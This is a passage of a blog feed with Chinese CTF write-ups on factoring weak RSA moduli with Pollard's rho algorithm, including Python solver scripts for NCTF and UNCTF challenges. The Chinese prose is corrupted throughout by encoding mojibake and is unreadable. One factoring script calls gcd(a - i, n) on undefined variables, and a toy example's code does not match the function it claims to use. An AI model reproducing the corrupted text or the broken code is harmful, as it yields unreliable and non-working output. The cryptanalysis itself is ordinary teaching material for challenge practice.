class="string">"NCTF"</span> <span class="keyword">in</span> n2s(x): </span><br><span class="line">            <span class="keyword">print</span> n2s(x) </span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/30/LjK7yHEBhNqga9O.png" alt="flag"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸€æ¬¡å€ŸNCTFäº†è§£äº†åœ¨åŸŸä¸­å¼€æ ¹çš„ä¸€ç§é«˜æ•ˆæ–¹æ³•ï¼Œ</p><p>å¹¶ä¸”æœ‰å¹¸æ‹¿åˆ°äº†ä¸€ä¸ªä¸€è¡€ï¼Œä¸å¾—ä¸è¯´ï¼Œè¿™å…¬å¼ï¼ŒçœŸé¦™~</p><p>å¦å¤–æ„Ÿè°¢è¿™æ¬¡NCTFï¼Œåœ¨è¿™æ¬¡å¯†ç å­¦çš„èµ›é¢˜ä¸­å­¦åˆ°äº†å¾ˆå¤šï¼Œå¦å¤–ä¸€é“childrsaä¹Ÿå¾ˆæœ‰æ„æ€ï¼ˆæœ‰æ„æ€åœ¨æˆ‘æ„å¤–çš„å‘ç°äº†å…¶ä¸­ä¸€ä¸ªç¥å¥‡è§„å¾‹23333ï¼‰</p><p>æœ€åå†æ¬¡æ„Ÿè°¢soreatuå¸ˆå‚…åˆ¶ä½œçš„ä¼˜è´¨èµ›é¢˜ä»¥åŠèµ›åè¯¦ç»†çš„wpä¸æŒ‡ç‚¹~</p><p><del>ä½†æ˜¯è¿™ä¸ªæ–¹æ³•çš„é™åˆ¶æœ‰ç‚¹å¤šï¼Œsoreatuå¸ˆå‚…ç»™å‡ºçš„æ–¹æ³•åº”è¯¥æ¯”è¾ƒå…·æœ‰æ™®é€‚æ€§ï¼Œè†œ</del></p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å°å±‹ </category>
          
          <category> Rsa </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rsa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ æµ…æPollard&#39;s rho algorithmåŠå…¶åº”ç”¨</title>
      <link href="/2019/11/11/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%B5%85%E6%9E%90Pollard&#39;s%20rho%20algorithm%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8/"/>
      <url>/2019/11/11/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%B5%85%E6%9E%90Pollard&#39;s%20rho%20algorithm%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>é¦–å‘äº<a href="https://xz.aliyun.com/t/6703" target="_blank" rel="noopener">å…ˆçŸ¥ç¤¾åŒº</a></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™å‡ å¤©åœ¨å­¦å¯†ç å­¦ï¼Œå…¶ä¸­æœ‰å…³RSAçš„å†…å®¹ã€‚ç”±äºå„ç§æ”»å‡»ç®—æ³•çš„å‡ºç°ï¼ŒRSAç°åœ¨å…¶å®å·²ç»ä¸å¤ªå®‰å…¨äº†(ç”±äºä¸æ°å½“çš„å‚æ•°çš„ä½¿ç”¨)ï¼Œä½†ä¸å¾—ä¸æ‰¿è®¤çš„æ˜¯ï¼Œå½“ä»ŠRSAåŠ å¯†æŠ€æœ¯è¿˜æ˜¯è¢«æ™®éåº”ç”¨çš„~</p><p>ç„¶ååœ¨åšé¢˜çš„æ—¶å€™ï¼Œé‡åˆ°äº†è¿™æ ·ä¸€é¢˜</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.<span class="keyword">number</span> import getPrime, isPrime</span><br><span class="line">flag = <span class="string">'BCNS&#123;***************&#125;'</span></span><br><span class="line">nbits = <span class="number">2048</span></span><br><span class="line">gbits = <span class="number">1000</span></span><br><span class="line">g = getPrime(<span class="keyword">int</span>(gbits))</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    <span class="keyword">a</span> = getPrime(<span class="keyword">int</span>(nbits * <span class="number">0.5</span>) - gbits)</span><br><span class="line">    <span class="keyword">p</span> = <span class="number">2</span> * g * <span class="keyword">a</span> + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(<span class="keyword">p</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    <span class="keyword">b</span> = getPrime(<span class="keyword">int</span>(nbits * <span class="number">0.5</span>) - gbits)</span><br><span class="line">    q = <span class="number">2</span> * g * <span class="keyword">b</span> + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">p</span> != q <span class="built_in">and</span> isPrime(q):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">N</span> = <span class="keyword">p</span> * q</span><br><span class="line"><span class="keyword">e</span> = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">def str2int(s):</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">int</span>(s.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">with <span class="keyword">open</span>(<span class="string">'pubkey.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> <span class="keyword">f</span>:</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">write</span>(str(<span class="keyword">e</span>) + <span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">write</span>(str(<span class="keyword">N</span>) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">plain = str2int(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">c</span> = <span class="built_in">pow</span>(plain, <span class="keyword">e</span>, <span class="keyword">N</span>)</span><br><span class="line">with <span class="keyword">open</span>(<span class="string">'cipher.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> <span class="keyword">f</span>:</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">write</span>(hex(<span class="keyword">c</span>))</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å¼•å…¥<a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.33.1333&rep=rep1&type=pdf" target="_blank" rel="noopener">Further Attacks on Server-Aided RSA Cryptosystems</a></p><p>Further Attacks on Server-Aided RSA Cryptosystemsè§£å†³çš„æ˜¯å¤§æ•°åˆ†è§£çš„ä¸€ä¸ªé—®é¢˜ï¼Œ</p><p>åˆ©ç”¨æ¡ä»¶æ˜¯å½“$N=p*q(Nâ‰¥512bit)$,å…¶ä¸­ï¼Œ$(p-1)$å’Œ $(q-1)$æœ‰ä¸€ä¸ªå¤§çš„å…¬å› æ•°Î²</p><p>åœ¨Further Attacks on Server-Aided RSA Cryptosystemsçš„ç¬¬ä¸€ä¸ªæ”»å‡»é˜¶æ®µä¸­æåˆ°ï¼šè¿ç”¨Pollardâ€™s Ï methods ï¼Œå…¶ä¸­ç”¨äºå–ä¼ªéšæœºå€¼çš„mapså‡½æ•°ä¸º $g(x)=x^{N-1}+3 \pmod {N}$ï¼Œè¿™å°†åœ¨æ—¶é—´å¤æ‚åº¦O($\sqrt{p/Î²}$)å†…åˆ†è§£Nï¼Œå› ä¸ºåœ¨$x^{N-1}\pmod{N}$ä¸­ï¼Œè‡³å¤šæœ‰ $\frac{(p-1)}{Î²}+1$ä¸ªå€¼</p><h2 id="Pollardâ€™s-Ï-algorithm"><a href="#Pollardâ€™s-Ï-algorithm" class="headerlink" title="Pollardâ€™s Ï algorithm"></a>Pollardâ€™s Ï algorithm</h2><p>æ³¢æ‹‰å¾·çš„ Ï ç®—æ³•æ˜¯æ•´æ•°åˆ†è§£çš„ä¸€ç§ç®—æ³•ã€‚ å®ƒæ˜¯çº¦ç¿° Â· æ³¢æ‹‰å¾·åœ¨1975å¹´å‘æ˜çš„ã€‚ å®ƒåªå ç”¨äº†å¾ˆå°‘çš„ç©ºé—´ï¼Œå¹¶ä¸”å®ƒçš„é¢„æœŸè¿è¡Œæ—¶é—´ä¸è¢«åˆ†è§£çš„åˆæ•°çš„æœ€å°è´¨å› æ•°å¤§å°çš„å¹³æ–¹æ ¹æˆæ­£æ¯”</p><h3 id="æ ¸å¿ƒæ€æƒ³"><a href="#æ ¸å¿ƒæ€æƒ³" class="headerlink" title="æ ¸å¿ƒæ€æƒ³"></a>æ ¸å¿ƒæ€æƒ³</h3><p>å‡è®¾æˆ‘ä»¬éœ€è¦åˆ†è§£$n$ï¼Œ$n=q*p$ï¼Œå…¶ä¸­$q$ä¸º$n$çš„éå¹³å‡¡å› å­ï¼ˆå³$q$ä¸ç­‰äº$1$ æˆ–$ n$)ã€‚æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ¨¡$n$çš„å¤šé¡¹å¼ï¼Œä¾‹å¦‚ï¼š$g(x) \equiv x^2+1 \pmod{n}$ï¼Œç”¨äºç”Ÿæˆâ€œä¼ªéšæœºâ€æ•°åˆ—ã€‚æˆ‘ä»¬é€‰æ‹©ä¸€ä¸ªèµ·å§‹å€¼ï¼Œä¾‹å¦‚ï¼Œ$2$ï¼Œå³$x_1=g(2)ï¼Œx_2=g(g(2))ï¼Œx<del>3</del>=g(g(g(2)))â€¦â€¦$</p><p>è¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªæ•°åˆ—æ˜¯æœ‰é™çš„ï¼Œç”±äºç”Ÿæ—¥é—®é¢˜ï¼Œåºåˆ— $x_k $modï¼ˆ$n$ï¼‰æœ€ç»ˆä¼šé‡å¤ï¼Œä¸€æ—¦ä¸€ä¸ªåºåˆ—ç”±é‡å¤çš„å€¼ï¼Œè¿™ä¸ªåºåˆ—å°±ä¼šå¾ªç¯ï¼Œå› ä¸ºæ¯ä¸ªå€¼ä¾èµ–äºå®ƒä¹‹å‰çš„å€¼ï¼Œ è¿™ç§æœ€ç»ˆå¾ªç¯çš„ç»“æ„äº§ç”Ÿäº†â€œ Ï ç®—æ³•â€çš„åç§°</p><p><img src="https://i.loli.net/2020/04/30/P9MQvlALodTsRI2.png" alt="Ï"></p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä¸¾ä¸€ä¸ªç®€å•çš„å°ä¾‹å­ï¼Œæˆ‘ä»¬è®¾$n$ä¸º640ï¼Œ$g(x)=x^2$ï¼Œ$x$èµ·å§‹å€¼ä¸º2ï¼Œ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    b*=2</span><br><span class="line">    <span class="builtin-name">print</span> b%640</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/30/Y8631MqfrxRKCmt.png" alt="example"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ128ä¸ºè¿™ä¸ªå–æ¨¡å¤šé¡¹å¼çš„å¾ªç¯èŠ‚ç‚¹ï¼Œ</p><p>å›åˆ°è¯é¢˜ï¼Œè¿™é‡Œç»§ç»­ç”¨ Floydâ€™s cycle-finding algorithmå‘ç°ï¼šè®¾ç«‹ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œ$i$ï¼Œ$j$ï¼Œåœ¨æ¯ä¸€æ­¥ä¸­ï¼Œ$i$æ¯æ¬¡ç§»åŠ¨ä¸€ä¸ªèŠ‚ç‚¹ï¼Œ$j$æ¯æ¬¡ç§»åŠ¨ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œç„¶åæ£€æŸ¥$gcd(x_i-x_j,n)$æ˜¯å¦â‰ 1ï¼Œå¦‚æœä¸ç­‰äºï¼Œé‚£ä¹ˆ$gcd$çš„ç»“æœä¾¿æ˜¯$p$ã€‚å¹¶ä¸”ï¼Œè¿™ä¹Ÿæ„å‘³ç€åºåˆ—${ x_k \pmod p}$ä¹Ÿä¼šé‡å¤ã€‚è¿™æ˜¯å› ä¸ºï¼Œå¦‚æœ$x_i \equiv x_j \pmod{p}$, é‚£ä¹ˆ$x_i$ä¸$x_j$ä¹‹é—´çš„å·®å¿…ç„¶æ˜¯$p$çš„å€æ•°ã€‚åŒæ—¶ï¼Œè¿™ä¹Ÿè¯´æ˜ï¼Œ$gcd(x_i-x_jï¼Œn)$ä¸ç­‰äº1çš„ç»“æœæ— è®ºå¦‚ä½•æœ€ç»ˆéƒ½ä¼šåˆ°æ¥ï¼Œä½†æ˜¯å¯èƒ½æ˜¯$n$è‡ªå·±ï¼Œæ­¤æ—¶ï¼Œä»£è¡¨Pollardâ€™s Ï algorithmå¤±è´¥äº†ï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„èµ·å§‹å€¼ï¼Œå†æ¬¡è¿ç®—ã€‚</p><h3 id="ä»£ç è¡¨ç¤º"><a href="#ä»£ç è¡¨ç¤º" class="headerlink" title="ä»£ç è¡¨ç¤º"></a>ä»£ç è¡¨ç¤º</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mapx</span><span class="params">(x)</span>:</span></span><br><span class="line">    x=(x*x+<span class="number">1</span>)%n</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_rho</span> <span class="params">(x1,x2)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x1=mapx(x1)</span><br><span class="line">        x2=mapx(mapx(x2))</span><br><span class="line">        p=gcd(x1-x2,n)</span><br><span class="line">        <span class="keyword">if</span> (p == n):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"fail"</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">elif</span> (p!=<span class="number">1</span>):</span><br><span class="line">            print(<span class="string">"p: "</span>+str(p))</span><br><span class="line">            print(<span class="string">"q: "</span>+str(n/p))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="å˜ä½“"><a href="#å˜ä½“" class="headerlink" title="å˜ä½“"></a>å˜ä½“</h3><p>1980å¹´ï¼ŒRichard Brent å‘è¡¨äº† rho ç®—æ³•çš„ä¸€ä¸ªæ›´å¿«çš„å˜ä½“ã€‚ ä»–ä½¿ç”¨äº†ä¸Pollardç›¸åŒçš„æ ¸å¿ƒæ€æƒ³ï¼Œä½†æ˜¯ä½¿ç”¨äº†ä¸åŒçš„å¾ªç¯æ£€æµ‹æ–¹æ³•ï¼Œç”¨ç›¸å…³çš„ Brentâ€™s cycle finding methodå–ä»£äº† Floydâ€™s cycle-finding algorithm</p><p>ä»–è§‚å¯Ÿåˆ°ï¼Œå¦‚æœ $gcd(a,n)&gt;1$ï¼Œé‚£ä¹ˆ$gcd(a*b,n)&gt;1$ï¼ˆbä¸ºä»»æ„æ­£æ•´æ•°ï¼‰ã€‚æ‰€ä»¥ï¼Œå–ä»£Floydâ€™s cycle-finding algorithmçš„æ¯ä¸€æ­¥éƒ½æ£€æŸ¥$gcd(a,n)$ï¼Œä»–å®šä¹‰äº†ä¸€ä¸ª$zï¼Œz=(x_2-x_3Â·(x_3-x_5â€¦â€¦(x_{101}-x_{201} \pmod {n} $å³æ¯ä¸€ç™¾æ­¥æ‰æ£€æŸ¥ä¸€æ¬¡$gcd(x_i-x_j,n)$ï¼Œè¿™ä¹ˆä½œä¸»è¦æ˜¯ä¸ºäº†åŠ é€Ÿç»“æœã€‚ ä½†æœ‰æ—¶å®ƒå¯èƒ½ä¼šå¼•å…¥é‡å¤å› å­å¯¼è‡´ç®—æ³•å¤±è´¥ï¼Œä¾‹å¦‚å½“næ˜¯ä¸€ä¸ªæ­£æ–¹å½¢æ—¶ã€‚ ä½†æ˜¯è¿™æ ·ä½¿ç”¨å¸¸è§„ç®—æ³•å°±å¥½äº†ã€‚</p><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>é‚£ä¹ˆå›è¿‡å¤´æ¥æˆ‘ä»¬è§£æœ€åˆå‡ºç°çš„é‚£ä¸€é“é¢˜ï¼Œé¢˜ä¸­ï¼Œ$p-1$å’Œ$q-1$æœ‰å¾ˆæ˜æ˜¾çš„å…¬å› å­2gï¼Œäºæ˜¯æ ¹æ®Further Attacks on Server-Aided RSA Cryptosystemsä¸­The first stage of the attackæ‰€æåˆ°çš„ï¼Œä¸ºäº†åˆ†è§£nï¼Œæˆ‘ä»¬åªéœ€è¦è¿ç”¨Pollardâ€™s Ï algorithmï¼Œå…¶ä¸­ç”¨äºç”Ÿæˆâ€œä¼ªéšæœºâ€æ•°åˆ—çš„å¤šé¡¹å¼ä¸ºï¼š$g(x)=(x^{n-1}+3)$%$n$</p><p>pythonä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mapx</span><span class="params">(x)</span>:</span></span><br><span class="line">    x=(pow(x,n<span class="number">-1</span>,n)+<span class="number">3</span>)%n    <span class="comment">#pow(x,n-1,n)æ˜¯ä¸ºäº†å‡å°æ•°å€¼ï¼ŒåŠ é€Ÿè¿ç®—ï¼Œ</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_rho</span> <span class="params">(x1,x2)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x1=mapx(x1)</span><br><span class="line">        x2=mapx(mapx(x2))</span><br><span class="line">        p=gcd(x1-x2,n)</span><br><span class="line">        <span class="keyword">if</span> (p == n):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"fail"</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">elif</span> (p!=<span class="number">1</span>):</span><br><span class="line">            print(<span class="string">"p: "</span>+str(p))</span><br><span class="line">            print(<span class="string">"q: "</span>+str(n/p))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    pollard_rho(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line">n= <span class="comment">#é¢˜ç›®æ‰€ç»™        </span></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/30/qanOpY2NcVIiwPu.png" alt="Pollard&#39;s Ï algorithm"></p><p>è¿è¡Œåæ¥ç§’æˆåŠŸåˆ†è§£ã€‚</p><h3 id="UNCTF-simple-rsa"><a href="#UNCTF-simple-rsa" class="headerlink" title="UNCTF-simple_rsa"></a>UNCTF-simple_rsa</h3><p>å‰å‡ å¤©æ‰“çš„UNCTFå…¶ä¸­æœ‰ä¸€é“æå…¶ç®€å•ç²—æš´çš„rsaçš„é¢˜ç›®</p><p>é¢˜ç›®ç®€å•ç²—æš´ï¼Œç»™äº†$e,n,c$</p><p><img src="https://i.loli.net/2020/04/30/ADkIoxrlGgvdBif.png" alt="UNCTF-simple_rsa"></p><p>æ˜¾ç„¶æ˜¯è¦åˆ†è§£$n$å¾—åˆ°$p$å’Œ$q$</p><p>ä½†æ˜¯ï¼Œå…¶ä¸­ï¼Œ$n$æœ‰2092ä½ï¼Œé™¤éäººæ‰‹è¶…ç®—~</p><p>ä½†å…¶å®è¿™é‡Œå¯ä»¥ç”¨åˆ°Pollardâ€™s Ï algorithmï¼Œå‰é¢æåˆ°å®ƒçš„é¢„æœŸè¿è¡Œæ—¶é—´ä¸è¢«åˆ†è§£çš„åˆæ•°çš„æœ€å°è´¨å› æ•°å¤§å°çš„å¹³æ–¹æ ¹æˆæ­£æ¯”</p><p>è€Œè¿™ä¹ˆå¤§çš„æ¨¡æ•°$n$ï¼Œæ˜¾ç„¶ä¸å¯èƒ½åªæœ‰$p,q$ä¸¤ä¸ªå› æ•°ï¼Œå¦åˆ™çœŸçš„æ˜¯è¦è®©è¶…ç®—å‡ºåŠ¨ï¼Œ</p><p>æ‰€ä»¥æˆ‘ä»¬çŒœæµ‹$n$æ˜¯ç”±è‹¥å¹²ä¸ªå°ç´ æ•°çš„ä¹˜ç§¯è€Œæ¥</p><p>äºæ˜¯åˆ©ç”¨Pollardâ€™s Ï algorithmåˆ†è§£è¿™ä¸ª$n$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mapx</span><span class="params">(x)</span>:</span></span><br><span class="line">    x=(x*x+<span class="number">1</span>)%n</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_rho</span><span class="params">(x1,x2)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        x1 = mapx(x1)</span><br><span class="line">        x2 = mapx(mapx(x2))</span><br><span class="line">        p = gcd(a - i, n)</span><br><span class="line">        <span class="keyword">if</span> p != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line">n=...</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (n!=<span class="number">1</span>):</span><br><span class="line">    p = pollard_rho(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">print</span> p</span><br><span class="line">    n = n / p</span><br></pre></td></tr></table></figure><p>è·‘ä¸ªåæ¥åˆ†é’Ÿåº”è¯¥å¯ä»¥å¾—åˆ°</p><p><img src="https://i.loli.net/2020/04/30/xqjZMEIm2s39GQv.png" alt="1"></p><p>ï¼ˆæˆ‘æ”¾ç€ç¨‹åºæ²¡ç®¡ï¼Œè·‘äº†å¥½å‡ ä¸ªå°æ—¶åå¾—åˆ°ï¼‰</p><p><img src="https://i.loli.net/2020/04/30/97XTafejQdtK6x2.png" alt="2"></p><p>ä½†å…¶å®æœ‰å‰é¢6ä¸ª<code>740160703366837</code>å¤§æ¦‚å·²ç»æ˜¯å¤Ÿäº†ï¼Œ<code>740160703366837</code>çš„6æ¬¡æ–¹å¤§æ¦‚æœ‰90ä½ï¼Œè€Œå¦‚æœflagæ˜¯md5å€¼å¾—è¯ï¼Œé•¿åº¦æ˜¯32+6ã€‚ç”±76ä½åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œæœ€å¤§ç”±92ä½åè¿›åˆ¶è¡¨ç¤ºï¼ˆæ˜¾ç„¶æ˜¯ä¸å¯èƒ½çš„ï¼Œè¿™ä¸ªæ—¶å€™å·²ç»ä¸æ˜¯å¯æ‰“å°å­—ç¬¦äº†ï¼‰æ‰€ä»¥90ä½ä½œä¸ºnåº”è¯¥å·²ç»æ˜¯å¤Ÿäº†ã€‚ï¼ˆå†ä¸æµå°±å†ç­‰ä¸€ä¼šå„¿,å¤šå‡ºæ¥å‡ ä¸ªå°±å¥½äº†ï¼‰</p><p>expï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import *</span><br><span class="line">e = 0x10001</span><br><span class="line">c = <span class="comment">#é¢˜ç›®æ‰€ç»™</span></span><br><span class="line">p = 740160703366837</span><br><span class="line">n = p**6</span><br><span class="line">c = c % n</span><br><span class="line">phi = (p-1)*(p**6)</span><br><span class="line">d = invert(e,phi)</span><br><span class="line"><span class="section">print(hex(pow(c,d,n))[2:].decode('hex'))</span></span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191106003417-1ca71876-ffea-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191106003417-1ca71876-ffea-1.png" alt="img"></a></p><p>è¿™é‡Œç›¸å½“äºæˆ‘ä»¬ç›´æ¥æŠŠåŸé¢˜çš„$n$ç»™çº‚æ”¹äº†ï¼Œ</p><p>ä½†ä¸ºå•¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ”¹$n$å‘¢ï¼Ÿ</p><p>è¿™é‡Œå†å›é¡¾ä¸€ä¸‹åŸºç¡€çŸ¥è¯†å¥½äº†</p><p>ä»¥ä¸‹æ˜¯ $M\equiv C^d pmod{N}$ çš„è¯æ˜</p><p><img src="https://i.loli.net/2020/04/30/zmodaOUq2NSv6IP.png" alt="RSAè§£å¯†éªŒè¯"></p><p>é¦–å…ˆï¼Œçœ‹åˆ°è¿™é‡Œè¦æ±‚$m&lt;n$ï¼Œæ‰€ä»¥è¿™é‡Œn_newå¤§äºmå³å¯</p><p>å…¶æ¬¡ï¼Œç”±äºn_new | nï¼Œæ‰€ä»¥ c % n_new == pow(m ,e ,n_new)</p><p>æ¨ç†å¦‚ä¸‹</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  n = n_new * <span class="keyword">x</span></span><br><span class="line">          <span class="keyword">c</span> = m^e % n</span><br><span class="line">        m^e = k*n + <span class="keyword">c</span></span><br><span class="line">        m^e = k*n_new*<span class="keyword">x</span> + <span class="keyword">c</span></span><br><span class="line">m^e % n_new = <span class="keyword">c</span> % n_new</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åªè¦æ–°çš„Næ»¡è¶³ï¼Œ$m&lt;N$, $m^e \equiv  c  \pmod {N}$ï¼Œå¹¶ä¸”$gcd(e,phi(N))=1$ï¼Œå³å¯é€†å‘æ±‚å‡º$m$æ¥ã€‚</p><p>è€Œä¸€èˆ¬æƒ…å†µä¸‹$n=p*q$ï¼Œæ‰€ä»¥åŸºæœ¬ä¸ç»™ä½ ç¯¡æ”¹$n$çš„æœºä¼š~</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸€æ¬¡å­¦ä¹ 